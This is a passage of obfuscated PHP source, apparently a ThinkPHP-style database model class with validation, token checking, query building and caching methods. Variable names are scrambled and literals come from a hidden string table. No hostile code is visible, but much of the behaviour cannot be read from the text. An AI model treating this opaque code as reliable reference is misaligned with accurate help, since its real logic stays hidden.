(empty($²„Ï×³)) { $²„Ï×³ = $_POST; } elseif (is_object($²„Ï×³)) { $²„Ï×³ = get_object_vars($²„Ï×³); } if (empty($²„Ï×³) || !is_array($²„Ï×³)) { $this->error = think_lang($©áèÀï¶[270]); return !1; } $²„Ï×³ = $this->parseFieldsMap($²„Ï×³, 0); $‹ÀÓ¦¡ = $‹ÀÓ¦¡ ? $‹ÀÓ¦¡ : (!empty($²„Ï×³[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$©áèÀï¶[272]])) { $–ã°å„ = $this->options[$©áèÀï¶[272]]; unset($this->options[$©áèÀï¶[272]]); } elseif ($‹ÀÓ¦¡ == THINK_MODEL_INSERT && isset($this->insertFields)) { $–ã°å„ = $this->insertFields; } elseif ($‹ÀÓ¦¡ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $–ã°å„ = $this->updateFields; } if (isset($–ã°å„)) { if (is_string($–ã°å„)) { $–ã°å„ = explode($©áèÀï¶[50], $–ã°å„); } if (think_config($©áèÀï¶[297])) { $–ã°å„[] = think_config($©áèÀï¶[298]); } foreach ($²„Ï×³ as $¨òÂğ€ß => $ÈÊá²ô) { if (!in_array($¨òÂğ€ß, $–ã°å„)) { unset($²„Ï×³[$¨òÂğ€ß]); } } } if (!$this->autoValidation($²„Ï×³, $‹ÀÓ¦¡)) { return !1; } if (!$this->autoCheckToken($²„Ï×³)) { $this->error = think_lang($©áèÀï¶[299]); return !1; } if ($this->autoCheckFields) { $–ã°å„ = $this->getDbFields(); foreach ($²„Ï×³ as $¨òÂğ€ß => $ÈÊá²ô) { if (!in_array($¨òÂğ€ß, $–ã°å„)) { unset($²„Ï×³[$¨òÂğ€ß]); } elseif (MAGIC_QUOTES_GPC && is_string($ÈÊá²ô)) { $²„Ï×³[$¨òÂğ€ß] = stripslashes($ÈÊá²ô); } } } $this->autoOperation($²„Ï×³, $‹ÀÓ¦¡); $this->data = $²„Ï×³; return $²„Ï×³; } public function autoCheckToken($âóş±ÆÆ) { $Æ“ô×šŸ =& $_SERVER[Ôó‡è­ƒ]; if (isset($this->options[$Æ“ô×šŸ[300]]) && !$this->options[$Æ“ô×šŸ[300]]) { return !0; } if (think_config($Æ“ô×šŸ[297])) { $Ööµñîê = think_config($Æ“ô×šŸ[298]); if (!isset($âóş±ÆÆ[$Ööµñîê]) || Session::get($Ööµñîê)) { return !1; } list($ÛßšÃË, $ÛÇ¿ŞÃâ) = explode($Æ“ô×šŸ[11], $âóş±ÆÆ[$Ööµñîê]); if ($ÛÇ¿ŞÃâ && Session::get($Ööµñîê . $Æ“ô×šŸ[10] . $ÛßšÃË) === $ÛÇ¿ŞÃâ) { Session::remove($Ööµñîê . $Æ“ô×šŸ[10] . $ÛßšÃË); return !0; } if (think_config($Æ“ô×šŸ[301])) { Session::remove($Ööµñîê . $Æ“ô×šŸ[10] . $ÛßšÃË); } return !1; } return !0; } public function regex($Æ²„ºËÓ, $Û¬§ÒÖ‹) { $¡¹Ã±½ú =& $_SERVER[Ôó‡è­ƒ]; $ß‹ç­“¥ = array($¡¹Ã±½ú[302] => $¡¹Ã±½ú[303], $¡¹Ã±½ú[304] => $¡¹Ã±½ú[305], $¡¹Ã±½ú[306] => $¡¹Ã±½ú[307], $¡¹Ã±½ú[308] => $¡¹Ã±½ú[309], $¡¹Ã±½ú[310] => $¡¹Ã±½ú[311], $¡¹Ã±½ú[312] => $¡¹Ã±½ú[313], $¡¹Ã±½ú[314] => $¡¹Ã±½ú[315], $¡¹Ã±½ú[289] => $¡¹Ã±½ú[316], $¡¹Ã±½ú[317] => $¡¹Ã±½ú[318]); if (isset($ß‹ç­“¥[strtolower($Û¬§ÒÖ‹)])) { $Û¬§ÒÖ‹ = $ß‹ç­“¥[strtolower($Û¬§ÒÖ‹)]; } return preg_match($Û¬§ÒÖ‹, $Æ²„ºËÓ) === 1; } private function autoOperation(&$÷²Ü·»Â, $À·ú£î¦) { $ÙŞ¬û¯ =& $_SERVER[Ôó‡è­ƒ]; if (!empty($this->options[$ÙŞ¬û¯[319]])) { $êƒ²ÄÉë = $this->options[$ÙŞ¬û¯[319]]; unset($this->options[$ÙŞ¬û¯[319]]); } elseif (!empty($this->_auto)) { $êƒ²ÄÉë = $this->_auto; } if (isset($êƒ²ÄÉë)) { foreach ($êƒ²ÄÉë as $²ãÈ£˜) { if (empty($²ãÈ£˜[2])) { $²ãÈ£˜[2] = THINK_MODEL_INSERT; } if ($À·ú£î¦ == $²ãÈ£˜[2] || $²ãÈ£˜[2] == THINK_MODEL_BOTH) { switch (trim($²ãÈ£˜[3])) { case $ÙŞ¬û¯[320]: case $ÙŞ¬û¯[321]: $ó‹›¸ = isset($²ãÈ£˜[4]) ? (array) $²ãÈ£˜[4] : array(); if (isset($÷²Ü·»Â[$²ãÈ£˜[0]])) { array_unshift($ó‹›¸, $÷²Ü·»Â[$²ãÈ£˜[0]]); } if ($ÙŞ¬û¯[320] == $²ãÈ£˜[3]) { $÷²Ü·»Â[$²ãÈ£˜[0]] = call_user_func_array($²ãÈ£˜[1], $ó‹›¸); } else { $÷²Ü·»Â[$²ãÈ£˜[0]] = call_user_func_array(array(&$this, $²ãÈ£˜[1]), $ó‹›¸); } break; case $ÙŞ¬û¯[272]: $÷²Ü·»Â[$²ãÈ£˜[0]] = $÷²Ü·»Â[$²ãÈ£˜[1]]; break; case $ÙŞ¬û¯[322]: if ($ÙŞ¬û¯[12] === $÷²Ü·»Â[$²ãÈ£˜[0]]) { unset($÷²Ü·»Â[$²ãÈ£˜[0]]); } break; case $ÙŞ¬û¯[323]: default: $÷²Ü·»Â[$²ãÈ£˜[0]] = $²ãÈ£˜[1]; } if (!1 === $÷²Ü·»Â[$²ãÈ£˜[0]]) { unset($÷²Ü·»Â[$²ãÈ£˜[0]]); } } } } return $÷²Ü·»Â; } protected function autoValidation($ìò¼¦´®, $›Ñ£‰‡Œ) { $Â¦âõ±ù =& $_SERVER[Ôó‡è­ƒ]; if (!empty($this->options[$Â¦âõ±ù[324]])) { $Ùóôõ¢ö = $this->options[$Â¦âõ±ù[324]]; unset($this->options[$Â¦âõ±ù[324]]); } elseif (!empty($this->_validate)) { $Ùóôõ¢ö = $this->_validate; } if (isset($Ùóôõ¢ö)) { if ($this->patchValidate) { $this->error = array(); } foreach ($Ùóôõ¢ö as $Óêãƒˆ‰ => $à³³‘ô) { if (empty($à³³‘ô[5]) || $à³³‘ô[5] == THINK_MODEL_BOTH || $à³³‘ô[5] == $›Ñ£‰‡Œ) { if (0 == strpos($à³³‘ô[2], $Â¦âõ±ù[325]) && strpos($à³³‘ô[2], $Â¦âõ±ù[326])) { $à³³‘ô[2] = think_lang(substr($à³³‘ô[2], 2, -1)); } $à³³‘ô[3] = isset($à³³‘ô[3]) ? $à³³‘ô[3] : THINK_EXISTS_VALIDATE; $à³³‘ô[4] = isset($à³³‘ô[4]) ? $à³³‘ô[4] : $Â¦âõ±ù[327]; switch ($à³³‘ô[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ìò¼¦´®, $à³³‘ô)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Â¦âõ±ù[12] != trim($ìò¼¦´®[$à³³‘ô[0]])) { if (!1 === $this->_validationField($ìò¼¦´®, $à³³‘ô)) { return !1; } } break; default: if (isset($ìò¼¦´®[$à³³‘ô[0]])) { if (!1 === $this->_validationField($ìò¼¦´®, $à³³‘ô)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($°Ô½±ğ¬, $ê’ÊÆÇ) { if (!1 === $this->_validationFieldItem($°Ô½±ğ¬, $ê’ÊÆÇ)) { if ($this->patchValidate) { $this->error[$ê’ÊÆÇ[0]] = $ê’ÊÆÇ[2]; } else { $this->error = $ê’ÊÆÇ[2]; return !1; } } return; } protected function _validationFieldItem($®©ã•ã‚, $üºçĞ•è) { $íÔ¹¼ùğ =& $_SERVER[Ôó‡è­ƒ]; switch (strtolower(trim($üºçĞ•è[4]))) { case $íÔ¹¼ùğ[320]: case $íÔ¹¼ùğ[321]: $’ğÊÆ…’ = isset($üºçĞ•è[6]) ? (array) $üºçĞ•è[6] : array(); if (is_string($üºçĞ•è[0]) && strpos($üºçĞ•è[0], $íÔ¹¼ùğ[50])) { $üºçĞ•è[0] = explode($íÔ¹¼ùğ[50], $üºçĞ•è[0]); } if (is_array($üºçĞ•è[0])) { foreach ($üºçĞ•è[0] as $×¤¸íØ) { $‰‹ê¹Úõ[$×¤¸íØ] = $®©ã•ã‚[$×¤¸íØ]; } array_unshift($’ğÊÆ…’, $‰‹ê¹Úõ); } else { array_unshift($’ğÊÆ…’, $®©ã•ã‚[$üºçĞ•è[0]]); } if ($íÔ¹¼ùğ[320] == $üºçĞ•è[4]) { return call_user_func_array($üºçĞ•è[1], $’ğÊÆ…’); } else { return call_user_func_array(array(&$this, $üºçĞ•è[1]), $’ğÊÆ…’); } case $íÔ¹¼ùğ[328]: return $®©ã•ã‚[$üºçĞ•è[0]] == $®©ã•ã‚[$üºçĞ•è[1]]; case $íÔ¹¼ùğ[329]: if (is_string($üºçĞ•è[0]) && strpos($üºçĞ•è[0], $íÔ¹¼ùğ[50])) { $üºçĞ•è[0] = explode($íÔ¹¼ùğ[50], $üºçĞ•è[0]); } $œß•¾í¿ = array(); if (is_array($üºçĞ•è[0])) { foreach ($üºçĞ•è[0] as $×¤¸íØ) { $œß•¾í¿[$×¤¸íØ] = $®©ã•ã‚[$×¤¸íØ]; } } else { $œß•¾í¿[$üºçĞ•è[0]] = $®©ã•ã‚[$üºçĞ•è[0]]; } if (!empty($®©ã•ã‚[$this->getPk()])) { $œß•¾í¿[$this->getPk()] = array($íÔ¹¼ùğ[330], $®©ã•ã‚[$this->getPk()]); } if ($this->where($œß•¾í¿)->find()) { return !1; } return !0; default: return $this->check($®©ã•ã‚[$üºçĞ•è[0]], $üºçĞ•è[1], $üºçĞ•è[4]); } } public function check($‘À¿ÑºÚ, $ÎÜ§•µ·, $ŸŸ†Œ¶² = "\x72\145\x67\145\x78") { $„¶™‹ó” =& $_SERVER[Ôó‡è­ƒ]; $ŸŸ†Œ¶² = strtolower(trim($ŸŸ†Œ¶²)); switch ($ŸŸ†Œ¶²) { case $„¶™‹ó”[7]: case $„¶™‹ó”[331]: $ÒòïÏ›ï = is_array($ÎÜ§•µ·) ? $ÎÜ§•µ· : explode($„¶™‹ó”[50], $ÎÜ§•µ·); return $ŸŸ†Œ¶² == $„¶™‹ó”[7] ? in_array($‘À¿ÑºÚ, $ÒòïÏ›ï) : !in_array($‘À¿ÑºÚ, $ÒòïÏ›ï); case $„¶™‹ó”[332]: case $„¶™‹ó”[333]: if (is_array($ÎÜ§•µ·)) { $¶³ïßÃ• = $ÎÜ§•µ·[0]; $¬É™Ö£ = $ÎÜ§•µ·[1]; } else { list($¶³ïßÃ•, $¬É™Ö£) = explode($„¶™‹ó”[50], $ÎÜ§•µ·); } return $ŸŸ†Œ¶² == $„¶™‹ó”[332] ? $‘À¿ÑºÚ >= $¶³ïßÃ• && $‘À¿ÑºÚ <= $¬É™Ö£ : $‘À¿ÑºÚ < $¶³ïßÃ• || $‘À¿ÑºÚ > $¬É™Ö£; case $„¶™‹ó”[334]: case $„¶™‹ó”[335]: return $ŸŸ†Œ¶² == $„¶™‹ó”[334] ? $‘À¿ÑºÚ == $ÎÜ§•µ· : $‘À¿ÑºÚ != $ÎÜ§•µ·; case $„¶™‹ó”[336]: $İİÑşÏ† = mb_strlen($‘À¿ÑºÚ, $„¶™‹ó”[337]); if (strpos($ÎÜ§•µ·, $„¶™‹ó”[50])) { list($¶³ïßÃ•, $¬É™Ö£) = explode($„¶™‹ó”[50], $ÎÜ§•µ·); return $İİÑşÏ† >= $¶³ïßÃ• && $İİÑşÏ† <= $¬É™Ö£; } else { return $İİÑşÏ† == $ÎÜ§•µ·; } case $„¶™‹ó”[338]: list($Áë‡Ö£Ÿ, $¶Å–…œÕ) = explode($„¶™‹ó”[50], $ÎÜ§•µ·); if (!is_numeric($Áë‡Ö£Ÿ)) { $Áë‡Ö£Ÿ = strtotime($Áë‡Ö£Ÿ); } if (!is_numeric($¶Å–…œÕ)) { $¶Å–…œÕ = strtotime($¶Å–…œÕ); } return NOW_TIME >= $Áë‡Ö£Ÿ && NOW_TIME <= $¶Å–…œÕ; case $„¶™‹ó”[339]: return in_array(get_client_ip(), explode($„¶™‹ó”[50], $ÎÜ§•µ·)); case $„¶™‹ó”[340]: return !in_array(get_client_ip(), explode($„¶™‹ó”[50], $ÎÜ§•µ·)); case $„¶™‹ó”[327]: default: return $this->regex($‘À¿ÑºÚ, $ÎÜ§•µ·); } } public function query($ÔŸÒ¨ï¤, $ÔÏÖ†Œí = false) { $¥³±¸€€ =& $_SERVER[Ôó‡è­ƒ]; if (!is_bool($ÔÏÖ†Œí) && !is_array($ÔÏÖ†Œí)) { $ÔÏÖ†Œí = func_get_args(); array_shift($ÔÏÖ†Œí); } $ÔŸÒ¨ï¤ = str_replace(array($¥³±¸€€[230], $¥³±¸€€[341]), $¥³±¸€€[53], $ÔŸÒ¨ï¤); $ÔŸÒ¨ï¤ = $this->parseSql($ÔŸÒ¨ï¤, $ÔÏÖ†Œí); return $this->db->query($ÔŸÒ¨ï¤); } public function execute($©ÛÆÉàü, $ÙÑÈ€ü— = false) { if (!is_bool($ÙÑÈ€ü—) && !is_array($ÙÑÈ€ü—)) { $ÙÑÈ€ü— = func_get_args(); array_shift($ÙÑÈ€ü—); } $©ÛÆÉàü = $this->parseSql($©ÛÆÉàü, $ÙÑÈ€ü—); return $this->db->execute($©ÛÆÉàü); } protected function parseSql($ÖÊ»úù•, $Ì•å‚¬ü) { $úÔ­‘õ‰ =& $_SERVER[Ôó‡è­ƒ]; if (!0 === $Ì•å‚¬ü) { $¦…ÃœÆ¸ = $this->_parseOptions(); $ÖÊ»úù• = $this->db->parseSql($ÖÊ»úù•, $¦…ÃœÆ¸); } elseif (is_array($Ì•å‚¬ü)) { $Ì•å‚¬ü = array_map(array($this->db, $úÔ­‘õ‰[342]), $Ì•å‚¬ü); $ÖÊ»úù• = vsprintf($ÖÊ»úù•, $Ì•å‚¬ü); } else { $ÖÊ»úù• = strtr($ÖÊ»úù•, array($úÔ­‘õ‰[343] => $this->getTableName(), $úÔ­‘õ‰[344] => think_config($úÔ­‘õ‰[243]))); } $this->db->setModel($this->name); return $ÖÊ»úù•; } public function db($ÔêØ«® = '', $„Ö»ËÆ¾ = '', $¿¢ê¬ªÎ = array()) { $Í¼Ê¹‚Ñ =& $_SERVER[Ôó‡è­ƒ]; if ($Í¼Ê¹‚Ñ[12] === $ÔêØ«® && $this->db) { return $this->db; } static $‘ğ¡¯Ôæ = array(); static $ô’ÑæÔ = array(); if (!isset($ô’ÑæÔ[$ÔêØ«®]) || isset($ô’ÑæÔ[$ÔêØ«®]) && $„Ö»ËÆ¾ && $‘ğ¡¯Ôæ[$ÔêØ«®] != $„Ö»ËÆ¾) { if (!empty($„Ö»ËÆ¾) && is_string($„Ö»ËÆ¾) && !1 === strpos($„Ö»ËÆ¾, $Í¼Ê¹‚Ñ[8])) { $„Ö»ËÆ¾ = think_config($„Ö»ËÆ¾); } $ÔêØ«® = think_guid($„Ö»ËÆ¾); $ô’ÑæÔ[$ÔêØ«®] = Db::getInstance($„Ö»ËÆ¾); } elseif (NULL === $„Ö»ËÆ¾) { $ô’ÑæÔ[$ÔêØ«®]->close(); unset($ô’ÑæÔ[$ÔêØ«®]); return; } if (!empty($¿¢ê¬ªÎ)) { if (is_string($¿¢ê¬ªÎ)) { parse_str($¿¢ê¬ªÎ, $¿¢ê¬ªÎ); } foreach ($¿¢ê¬ªÎ as $ä…ïåƒ => $İ—•´½») { $this->setProperty($ä…ïåƒ, $İ—•´½»); } } $‘ğ¡¯Ôæ[$ÔêØ«®] = $„Ö»ËÆ¾; $this->db = $ô’ÑæÔ[$ÔêØ«®]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $µ©›¥³¬ = get_class($this); if ($µ©›¥³¬ == $_SERVER[Ôó‡è­ƒ][345]) { return $this->name; } $this->name = substr($µ©›¥³¬, 0, -5); } return $this->name; } public function getTableName() { $ìé±ğó¢ =& $_SERVER[Ôó‡è­ƒ]; if (empty($this->trueTableName)) { $‚Ù®«â« = !empty($this->tablePrefix) ? $this->tablePrefix : $ìé±ğó¢[12]; if (!empty($this->tableName)) { $‚Ù®«â« .= $this->tableName; } else { $‚Ù®«â« .= think_parse_name($this->name); } $this->trueTableName = strtolower($‚Ù®«â«); } return (!empty($this->dbName) ? $this->dbName . $ìé±ğó¢[10] : $ìé±ğó¢[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $¯÷‡‰²² =& $_SERVER[Ôó‡è­ƒ]; return isset($this->fields[$¯÷‡‰²²[250]]) ? $this->fields[$¯÷‡‰²²[250]] : $this->pk; } public function getDbFields() { $Õ·¸ŠœÛ =& $_SERVER[Ôó‡è­ƒ]; if (isset($this->options[$Õ·¸ŠœÛ[278]])) { $Ó§Ïñ°Ù = $this->db->getFields($this->options[$Õ·¸ŠœÛ[278]]); return $Ó§Ïñ°Ù ? array_keys($Ó§Ïñ°Ù) : !1; } if ($this->fields) { $Ó§Ïñ°Ù = $this->fields; unset($Ó§Ïñ°Ù[$Õ·¸ŠœÛ[249]], $Ó§Ïñ°Ù[$Õ·¸ŠœÛ[250]], $Ó§Ïñ°Ù[$Õ·¸ŠœÛ[251]], $Ó§Ïñ°Ù[$Õ·¸ŠœÛ[248]]); return $Ó§Ïñ°Ù; } return !1; } public function data($øõ’ÁÉ = '') { $©¼êÍ© =& $_SERVER[Ôó‡è­ƒ]; if ($©¼êÍ©[12] === $øõ’ÁÉ && !empty($this->data)) { return $this->data; } if (is_object($øõ’ÁÉ)) { $øõ’ÁÉ = get_object_vars($øõ’ÁÉ); } elseif (is_string($øõ’ÁÉ)) { parse_str($øõ’ÁÉ, $øõ’ÁÉ); } elseif (!is_array($øõ’ÁÉ)) { think_exception(think_lang($©¼êÍ©[270])); } $this->data = $øõ’ÁÉ; return $this; } public function join($³Ä»©®) { $Í¿¯„í¯ =& $_SERVER[Ôó‡è­ƒ]; if (is_array($³Ä»©®)) { $this->options[$Í¿¯„í¯[281]] = $³Ä»©®; } elseif (!empty($³Ä»©®)) { $this->options[$Í¿¯„í¯[281]][] = $³Ä»©®; } return $this; } public function union($òºõÊÕ›, $¦µ “à = false) { $ç™«µÆ¼ =& $_SERVER[Ôó‡è­ƒ]; if (empty($òºõÊÕ›)) { return $this; } if ($¦µ “à) { $this->options[$ç™«µÆ¼[346]][$ç™«µÆ¼[347]] = !0; } if (is_object($òºõÊÕ›)) { $òºõÊÕ› = get_object_vars($òºõÊÕ›); } if (is_string($òºõÊÕ›)) { $ÇÏãõ‹³ = $òºõÊÕ›; } elseif (is_array($òºõÊÕ›)) { if (isset($òºõÊÕ›[0])) { $this->options[$ç™«µÆ¼[346]] = array_merge($this->options[$ç™«µÆ¼[346]], $òºõÊÕ›); return $this; } else { $ÇÏãõ‹³ = $òºõÊÕ›; } } else { think_exception(think_lang($ç™«µÆ¼[270])); } $this->options[$ç™«µÆ¼[346]][] = $ÇÏãõ‹³; return $this; } public function cache($™ñŠÁËá = true, $ìèİ°Øú = null, $İ·¿ĞÊÀ = '') { $ğîŸ„› =& $_SERVER[Ôó‡è­ƒ]; if (!1 !== $™ñŠÁËá) { $this->options[$ğîŸ„›[348]] = array($ğîŸ„›[95] => $™ñŠÁËá, $ğîŸ„›[338] => $ìèİ°Øú, $ğîŸ„›[33] => $İ·¿ĞÊÀ); } return $this; } public function field($®İ®“õœ, $Ô ôşÊ = false) { $òğµö´‰ =& $_SERVER[Ôó‡è­ƒ]; if (!0 === $®İ®“õœ) { $èÈÎÍÈŞ = $this->getDbFields(); $®İ®“õœ = $èÈÎÍÈŞ ? $èÈÎÍÈŞ : $òğµö´‰[185]; } elseif ($Ô ôşÊ) { if (is_string($®İ®“õœ)) { $®İ®“õœ = explode($òğµö´‰[50], $®İ®“õœ); } $èÈÎÍÈŞ = $this->getDbFields(); $®İ®“õœ = $èÈÎÍÈŞ ? array_diff($èÈÎÍÈŞ, $®İ®“õœ) : $®İ®“õœ; } $this->options[$òğµö´‰[272]] = $®İ®“õœ; return $this; } public function scope($ÁØÀò’ = '', $Üéšãèº = NULL) { $Ã¡ê•¿· =& $_SERVER[Ôó‡è­ƒ]; if ($Ã¡ê•¿·[12] === $ÁØÀò’) { if (isset($this->_scope[$Ã¡ê•¿·[37]])) { $Ëˆ»ªÃ› = $this->_scope[$Ã¡ê•¿·[37]]; } else { return $this; } } elseif (is_string($ÁØÀò’)) { $Î®İŒŠ“ = explode($Ã¡ê•¿·[50], $ÁØÀò’); $Ëˆ»ªÃ› = array(); foreach ($Î®İŒŠ“ as $á£´Æ‘˜) { if (!isset($this->_scope[$á£´Æ‘˜])) { continue; } $Ëˆ»ªÃ› = array_merge($Ëˆ»ªÃ›, $this->_scope[$á£´Æ‘˜]); } if (!empty($Üéšãèº) && is_array($Üéšãèº)) { $Ëˆ»ªÃ› = array_merge($Ëˆ»ªÃ›, $Üéšãèº); } } elseif (is_array($ÁØÀò’)) { $Ëˆ»ªÃ› = $ÁØÀò’; } if (is_array($Ëˆ»ªÃ›) && !empty($Ëˆ»ªÃ›)) { $this->options = array_merge($this->options, array_change_key_case($Ëˆ»ªÃ›)); } return $this; } public function where($‡ô »›, $¬¸Ë™¢ß = null) { $ÊÄÕŠ‘¶ =& $_SERVER[Ôó‡è­ƒ]; if (!is_null($¬¸Ë™¢ß) && is_string($‡ô »›)) { if (!is_array($¬¸Ë™¢ß)) { $¬¸Ë™¢ß = func_get_args(); array_shift($¬¸Ë™¢ß); } $¬¸Ë™¢ß = array_map(array($this->db, $ÊÄÕŠ‘¶[342]), $¬¸Ë™¢ß); $‡ô »› = vsprintf($‡ô »›, $¬¸Ë™¢ß); } elseif (is_object($‡ô »›)) { $‡ô »› = get_object_vars($‡ô »›); } elseif (is_array($‡ô »›)) { foreach ($‡ô »› as $í¦­§íü => $íª×¶åÔ) { if ((is_numeric($í¦­§íü) || !$í¦­§íü) && is_string($íª×¶åÔ)) { if (strpos($íª×¶åÔ, $ÊÄÕŠ‘¶[349]) === 0) { continue; } think_trace($ÊÄÕŠ‘¶[350], $ÊÄÕŠ‘¶[12], $ÊÄÕŠ‘¶[49]); die; } } } if (is_string($‡ô »›) && $ÊÄÕŠ‘¶[12] != $‡ô »›) { $øƒˆÕ‚õ = array(); $øƒˆÕ‚õ[$ÊÄÕŠ‘¶[351]] = $‡ô »›; $‡ô »› = $øƒˆÕ‚õ; } if (isset($this->options[$ÊÄÕŠ‘¶[274]])) { $this->options[$ÊÄÕŠ‘¶[274]] = array_merge($this->options[$ÊÄÕŠ‘¶[274]], $‡ô »›); } else { $this->options[$ÊÄÕŠ‘¶[274]] = $‡ô »›; } return $this; } public function limit($ÂñòÆ¤ğ, $ÉÚ½áÉË = null) { $×¦ÊğÃ† =& $_SERVER[Ôó‡è­ƒ]; $this->options[$×¦ÊğÃ†[291]] = is_null($ÉÚ½áÉË) ? $ÂñòÆ¤ğ : $ÂñòÆ¤ğ . $×¦ÊğÃ†[50] . $ÉÚ½áÉË; return $this; } public function page($¥°‰ÙŒÛ, $£Û²ÔÎ = null) { $şŞÈóèÜ =& $_SERVER[Ôó‡è­ƒ]; $this->options[$şŞÈóèÜ[352]] = is_null($£Û²ÔÎ) ? $¥°‰ÙŒÛ : $¥°‰ÙŒÛ . $şŞÈóèÜ[50] . $£Û²ÔÎ; return $this; } public function comment($•ËÔÓ®ü) { $this->options[$_SERVER[Ôó‡è­ƒ][353]] = $•ËÔÓ®ü; return $this; } public function setProperty($›ÈÏ¹îù, $èéõğ‚À) { if (property_exists($this, $›ÈÏ¹îù)) { $this->{$›ÈÏ¹îù} = $èéõğ‚À; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\x79\124\151\x6d\x65", "\164\151\x6d\145", "\151\156\x73\145\x72\164\x2c\165\x70\144\x61\164\145", "\146\165\156\x63\x74\151\x6f\x6e"), array("\x63\162\x65\x61\x74\145\x54\151\155\145", "\x74\151\x6d\x65", "\151\156\x73\x65\x72\x74", "\146\165\x6e\143\164\x69\157\x6e")); public function setDataAuto($ˆÂßéå¸) { $this->dataAuto = $ˆÂßéå¸; } public function __construct($ßìß¤ã¬ = '', $úƒ“éÊ  = '', $Â°–¯Ò– = '') { parent::__construct($ßìß¤ã¬, $úƒ“éÊ , $Â°–¯Ò–); } protected $tableMeta = array(); protected function _beforeInsert(&$«ŠÛ¬º, $İ™îî«) { $Åêâ“†ì =& $_SERVER[Ôó‡è­ƒ]; if (!$this->checkDataAutoHas($Åêâ“†ì[354])) { return; } $this->dataBeforeFilter($«ŠÛ¬º, $Åêâ“†ì[354]); } protected function _beforeUpdate(&$Èò¥ßÖó, $¸ş§¢ÕÌ) { $™ùË¿ˆ€ =& $_SERVER[Ôó‡è­ƒ]; if (!$this->checkDataAutoHas($™ùË¿ˆ€[355])) { return; } $this->dataBeforeFilter($Èò¥ßÖó, $™ùË¿ˆ€[355]); } protected function _afterSelect(&$±”Ôàş…, $¾´Íº‡¬) { if (!is_array($±”Ôàş…)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ôó‡è­ƒ][356])) { return; } foreach ($±”Ôàş… as &$´Šâ÷ƒ½) { $this->dataAfterFilter($´Šâ÷ƒ½); } unset($´Šâ÷ƒ½); } protected function _afterFind(&$†»Şº“Ú, $•é“¹£) { if (!is_array($†»Şº“Ú)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ôó‡è­ƒ][356])) { return; } $this->dataAfterFilter($†»Şº“Ú); } public static function textEncode($ñÁº„°) { if (!$ñÁº„°) { return $ñÁº„°; } $¸÷¼‚’¦ = json_encode($ñÁº„°); $¸÷¼‚’¦ = preg_replace_callback($_SERVER[Ôó‡è­ƒ][357], function ($åºãÃ½®) { return addslashes($åºãÃ½®[0]); }, $¸÷¼‚’¦); return json_decode($¸÷¼‚’¦); } public static function textDecode($Æõ’ á¥) { $µÆôô°ç =& $_SERVER[Ôó‡è­ƒ]; $—¡›Şàš = json_encode($Æõ’ á¥); $—¡›Şàš = preg_replace_callback($µÆôô°ç[358], function ($ƒáÓ«‘º) { return $_SERVER[Ôó‡è­ƒ][98]; }, $—¡›Şàš); return json_decode($—¡›Şàš); } public function setAutoIncrement($Ì®±Ó÷) { $­èú‡÷æ = array($this->getPk() => $Ì®±Ó÷); $ô¦úŞú™ = $this->data($­èú‡÷æ)->add(); if ($ô¦úŞú™) { $this->delete($ô¦úŞú™); } } public function getAutoIncrement() { $¹›¸°°í = $this->getTableName(); $¶Ôø‡ = $this->max($this->getPk()); $³×³“› = $this->query("\163\x68\157\x77\x20\164\x61\142\154\x65\x20\x73\x74\x61\164\x75\x73\x20\167\x68\x65\162\145\x20\116\141\155\145\75\47{$¹›¸°°í}\x27"); $¦Ú£¢¸¬ = $³×³“›[0][$_SERVER[Ôó‡è­ƒ][359]]; $ĞÜšˆ»À = max($¶Ôø‡, $¦Ú£¢¸¬); return $ĞÜšˆ»À; } protected function _callBefore($ÙèùâãØ, $ÎÌ…’¾Ş) { return $this->cacheCallCheck($ÙèùâãØ, $ÎÌ…’¾Ş, !1); } protected function _callAfter($ç‘“¥”ú, $ŞàĞúïµ) { return $this->cacheCallCheck($ç‘“¥”ú, $ŞàĞúïµ, !0); } protected function cacheFunctionAlias($µ½Úøƒœ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($™ææåœª, $¤¡±­ƒ¤, $óıª­¡ = false) { $ëÕ¨’ş = $this->cacheFunctionAlias($¤¡±­ƒ¤); if (!$ëÕ¨’ş) { return; } foreach ($ëÕ¨’ş as $Åß–·µ´ => $ßà´¸©º) { $„²ß˜Ğ´ = $ßà´¸©º[0]; $Áè¥ô„ = explode($_SERVER[Ôó‡è­ƒ][50], $ßà´¸©º[1]); if ($™ææåœª == $Åß–·µ´) { return $this->cacheFunctionGet($Åß–·µ´, $„²ß˜Ğ´); } if ($óıª­¡ && in_array($™ææåœª, $Áè¥ô„)) { $this->cacheFunctionClear($Åß–·µ´, $„²ß˜Ğ´); } } } public function cacheFunctionGet($ÉáşÄ§°, $Êş§â™§) { $ÚÑô›êü = $this->cacheKeyMake($ÉáşÄ§°, $Êş§â™§); $‘®Èº– = Cache::get($ÚÑô›êü); if (!is_array($‘®Èº–)) { $‘®Èº– = call_user_func_array(array($this, $ÉáşÄ§°), array($Êş§â™§, !0)); Cache::set($ÚÑô›êü, $‘®Èº–); } return $‘®Èº–; } public function cacheFunctionClear($óÅòï‰ú, $³æœ˜ÈÅ) { $ßá”ˆ = $³æœ˜ÈÅ; if (!is_array($³æœ˜ÈÅ)) { $ßá”ˆ = array($³æœ˜ÈÅ); } foreach ($ßá”ˆ as $Õ†­¼°ƒ) { $ãè³”³ö = $this->cacheKeyMake($óÅòï‰ú, $Õ†­¼°ƒ); Cache::remove($ãè³”³ö); } } private function cacheKeyMake($éÓ®©³‡, $÷ÓÇˆÊ­) { $ÍëÆÔÓ³ =& $_SERVER[Ôó‡è­ƒ]; 